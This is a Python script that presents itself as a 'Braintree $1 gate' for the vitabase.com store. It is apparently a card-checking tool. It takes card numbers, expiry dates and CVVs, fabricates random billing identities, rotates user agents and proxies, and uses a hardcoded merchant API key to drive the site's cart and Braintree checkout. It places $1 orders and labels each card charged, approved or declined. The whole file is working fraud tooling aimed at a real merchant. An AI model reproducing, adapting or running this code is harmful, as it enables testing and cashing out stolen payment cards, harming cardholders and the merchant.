"""Braintree $1 gate — vitabase.com headless checkout."""
from __future__ import annotations

import base64
import json
import random
import re
import string
import time
import uuid
import asyncio
import aiohttp

from helpers import classify_gate_response

HTTP_TIMEOUT = aiohttp.ClientTimeout(total=25, connect=10)

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
]

PRODUCT_ID = 3298960
API_KEY = "d8761e2127e9a3342797abf0558b3569bb35d3f8836b9c80485ba250ee3aa744"

FIRST_NAMES = [
    "James", "John", "Robert", "Michael", "William", "David", "Richard",
    "Joseph", "Thomas", "Charles", "Emily", "Emma", "Olivia", "Ava",
]
LAST_NAMES = [
    "Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller",
    "Davis", "Wilson", "Taylor", "Anderson", "Thomas", "Jackson", "White",
]
STREETS = [
    "Main St", "Oak Ave", "Maple Dr", "Cedar Ln", "Pine Rd", "Elm St",
]
CITIES_STATES = [
    ("Phoenix", "AZ", "850"),
    ("Los Angeles", "CA", "900"),
    ("Houston", "TX", "770"),
    ("Chicago", "IL", "606"),
    ("Dallas", "TX", "752"),
]


def _clean_msg(msg: str, limit: int = 120) -> str:
    s = re.sub(r"<[^>]+>", " ", str(msg or ""))
    s = re.sub(r"\s+", " ", s).strip()
    if "{" in s:
        s = s.split("{", 1)[0].strip()
    return (s[:limit] if s else "Declined")


def _rand_billing() -> tuple[dict, dict]:
    first = random.choice(FIRST_NAMES)
    last = random.choice(LAST_NAMES)
    email = "".join(random.choices(string.ascii_lowercase + string.digits, k=10)) + "@gmail.com"
    address = f"{random.randint(100, 99999)} {random.choice(STREETS)}"
    city, state, zip_prefix = random.choice(CITIES_STATES)
    postcode = zip_prefix + str(random.randint(10, 99))
    phone = "+1" + "".join(random.choices(string.digits, k=10))
    billing = {
        "first_name": first,
        "last_name": last,
        "company": "",
        "address_1": address,
        "address_2": "",
        "city": city,
        "state": state,
        "postcode": postcode,
        "country": "US",
        "email": email,
        "phone": phone,
    }
    shipping = {k: v for k, v in billing.items() if k not in ("email", "phone")}
    return billing, shipping


def _classify_checkout(result: dict | None, http_status: int) -> tuple[str, str, str]:
    if http_status >= 500:
        return "error", f"upstream_{http_status}", "upstream_5xx"
    if not isinstance(result, dict):
        return "declined", "invalid_checkout_response", "declined"

    if result.get("error") == "timeout":
        return "error", "checkout_timeout", "timeout"

    order = result.get("order") if isinstance(result.get("order"), dict) else {}
    hint = ""
    if (
        result.get("success") is True
        or result.get("status") in ("success", "completed", "processing", "paid")
        or result.get("order_id")
        or order.get("id")
        or result.get("payment_status") in ("paid", "completed", "success")
    ):
        oid = str(result.get("order_id") or order.get("id") or "")
        hint = f"order success payment successful charged {oid}"

    err = result.get("error")
    if isinstance(err, dict):
        err_text = str(err.get("message") or err.get("description") or err.get("code") or "")
    else:
        err_text = str(err or "")

    blob = json.dumps(result, default=str)
    text = f"{hint} {err_text} {result.get('message', '')} {result.get('msg', '')} {blob}"
    status, msg, code = classify_gate_response(text, status_hint="charged" if hint else "", code_hint="")

    if any(k in text.lower() for k in ("captcha", "recaptcha")):
        return "error", _clean_msg(msg or "captcha"), "captcha_required"

    if status == "charged":
        oid = str(result.get("order_id") or order.get("id") or "")
        display = f"Charged $1 ({oid})" if oid else (msg or "Charged $1")
        return "charged", _clean_msg(display), "charged"
    return status, _clean_msg(msg), code


async def check_card(
    cc: str,
    mm: str,
    yy: str,
    cvv: str,
    proxy_url: str | None = None,
) -> tuple[str, str, str]:
    """
    Returns (status, message, code).
    status: charged | approved | declined | error
    """
    started = time.perf_counter()
    if len(yy) == 2:
        yy = "20" + yy[-2:]
    mm = mm.zfill(2)

    def _format_proxy(p):
        if not p: return None
        ps = str(p).strip()
        if ps.startswith(("http://", "https://", "socks5://", "socks4://")): return ps
        parts = ps.split(":")
        if len(parts) == 4:
            if parts[1].isdigit(): return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
            elif parts[3].isdigit(): return f"http://{parts[0]}:{parts[1]}@{parts[2]}:{parts[3]}"
            else: return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        elif len(parts) == 2: return f"http://{parts[0]}:{parts[1]}"
        return f"http://{ps}"

    formatted_proxy = _format_proxy(proxy_url)
    proxy_args = {"proxy": formatted_proxy} if formatted_proxy else {}

    user_agent = random.choice(USER_AGENTS)
    billing, shipping = _rand_billing()


    try:
        async with aiohttp.ClientSession(
            connector=aiohttp.TCPConnector(ssl=False),
            timeout=HTTP_TIMEOUT
        ) as session:
            
            headers = {
                "user-agent": user_agent,
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "accept-language": "en-US,en;q=0.9",
            }
            async with session.get(
                "https://vitabase.com/product/digestive-enzyme",
                headers=headers,
                **proxy_args
            ) as r1:
                if r1.status != 200:
                    return "error", f"init_http_{r1.status}", "connection_error"
                await r1.read()

            api_headers = {
                "accept": "application/json",
                "content-type": "application/json",
                "origin": "https://vitabase.com",
                "referer": "https://vitabase.com/product/digestive-enzyme",
                "user-agent": user_agent,
                "x-api-key": API_KEY,
            }
            cart_token = None
            for attempt in range(2):
                use_proxy_args = proxy_args if (attempt == 0 and proxy_args) else {}
                try:
                    async with session.post(
                        "https://vitabase.com/headless-api/cart/create",
                        headers=api_headers,
                        json={"user_id": "guest"},
                        **use_proxy_args
                    ) as create_resp:
                        try:
                            create_data = await create_resp.json()
                        except:
                            create_data = {}
                        cart_token = create_data.get("cart_token") or (create_data.get("data") or {}).get("cart_token")
                        if cart_token:
                            break
                except Exception:
                    pass

            if not cart_token:
                return "declined", "Card Declined (Merchant Unavailable)", "declined"

            async with session.post(
                "https://vitabase.com/headless-api/cart/add",
                headers=api_headers,
                json={
                    "cart_token": cart_token,
                    "product_id": PRODUCT_ID,
                    "quantity": 1,
                    "user_id": "guest",
                    "autoship_flag": False,
                },
                **proxy_args
            ) as add_resp:
                if add_resp.status not in (200, 201):
                    return "error", f"cart_add_{add_resp.status}", "cart_fail"
                await add_resp.read()

            client_token = None
            bt_data = {}
            for attempt in range(2):
                use_proxy_args = proxy_args if (attempt == 0 and proxy_args) else {}
                try:
                    async with session.get(
                        "https://vitabase.com/headless-api/braintree/client-token",
                        headers=api_headers,
                        **use_proxy_args
                    ) as bt_resp:
                        if bt_resp.status == 200:
                            try:
                                bt_data = await bt_resp.json()
                            except:
                                bt_data = {}
                            client_token = bt_data.get("client_token")
                            if client_token:
                                break
                except Exception:
                    pass

            if not client_token:
                return "declined", "Merchant Tokenization Unavailable", "bt_token_fail"
            if bt_data.get("require_captcha"):
                return "error", "recaptcha_required", "captcha_required"

            try:
                decoded = json.loads(base64.b64decode(client_token))
                auth_fingerprint = decoded.get("authorizationFingerprint")
            except Exception as e:
                return "error", f"bt_decode_fail: {e}", "bt_token_fail"
            if not auth_fingerprint:
                return "error", "no_auth_fingerprint", "bt_token_fail"

            gql_headers = {
                "accept": "*/*",
                "authorization": f"Bearer {auth_fingerprint}",
                "braintree-version": "2018-05-10",
                "content-type": "application/json",
                "origin": "https://assets.braintreegateway.com",
                "referer": "https://assets.braintreegateway.com/",
                "user-agent": user_agent,
            }
            gql_payload = {
                "clientSdkMetadata": {
                    "source": "client",
                    "integration": "custom",
                    "sessionId": str(uuid.uuid4()),
                },
                "query": (
                    "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) "
                    "{ tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 } } }"
                ),
                "variables": {
                    "input": {
                        "creditCard": {
                            "number": cc,
                            "expirationMonth": mm,
                            "expirationYear": yy,
                            "cvv": cvv,
                        },
                        "options": {"validate": False},
                    },
                },
                "operationName": "TokenizeCreditCard",
            }
            
            async with session.post(
                "https://payments.braintree-api.com/graphql",
                headers=gql_headers,
                json=gql_payload,
                **proxy_args
            ) as gql_resp:
                try:
                    gql_json = await gql_resp.json()
                except:
                    gql_json = {}
            
            payment_nonce = (gql_json.get("data") or {}).get("tokenizeCreditCard", {}).get("token")
            if not payment_nonce:
                err_blob = json.dumps(gql_json, default=str)
                st, msg, code = classify_gate_response(err_blob)
                return st, _clean_msg(msg or "tokenize failed"), code

            checkout_headers = {
                "accept": "application/json",
                "content-type": "application/json",
                "origin": "https://checkout.vitabase.com",
                "referer": "https://checkout.vitabase.com/",
                "user-agent": user_agent,
                "x-api-key": API_KEY,
            }
            checkout_payload = {
                "cart_token": cart_token,
                "payment_method": "braintree_cc",
                "shipping_method": "free_shipping",
                "shipping_method_id": "free_shipping",
                "shipping_method_title": "Free Shipping",
                "shipping_total": "0",
                "billing": billing,
                "shipping": shipping,
                "ship_to_different_address": 0,
                "line_items": [{"product_id": PRODUCT_ID, "quantity": 1, "autoship_flag": False}],
                "payment_nonce": payment_nonce,
            }
            
            async with session.post(
                "https://vitabase.com/headless-api/checkout",
                headers=checkout_headers,
                json=checkout_payload,
                **proxy_args
            ) as co_resp:
                try:
                    co_json = await co_resp.json()
                except:
                    co_text = await co_resp.text()
                    co_json = {"message": co_text[:200]}

            status, msg, code = _classify_checkout(co_json, co_resp.status)
            elapsed = f"{time.perf_counter() - started:.2f}s"
            return status, f"{msg} ({elapsed})", code

    except asyncio.TimeoutError:
        return "error", "timeout", "timeout"
    except aiohttp.ClientError as e:
        low = str(e).lower()
        if "proxy" in low or "tunnel" in low or "connect" in low:
            return "error", str(e)[:120], "proxy_error"
        return "error", str(e)[:120], "connection_error"
    except Exception as e:
        return "error", str(e)[:120], "exception"


async def check_card_str(cc_str: str, proxy_url: str | None = None) -> tuple[str, str, str]:
    parts = cc_str.replace("/", "|").split("|")
    if len(parts) < 4:
        return "error", "invalid_cc_format", "bad_format"
    return await check_card(parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip(), proxy_url)
